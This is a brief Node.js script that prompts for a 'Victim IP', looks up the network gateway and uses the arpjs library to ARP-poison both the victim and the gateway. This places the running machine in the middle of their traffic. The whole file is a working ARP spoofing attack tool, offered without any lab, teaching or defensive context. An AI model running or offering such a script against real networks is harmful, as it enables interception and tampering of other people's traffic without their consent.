var arp = require('arpjs');
var scanf = require('scanf');
var network = require('network');

console.log('Input Victim IP : ');
var victim_ip = scanf('%s');

network.get_gateway_ip(function(err, ip) {
	arp.poison(ip, victim_ip);
	arp.poison(victim_ip, ip);
})
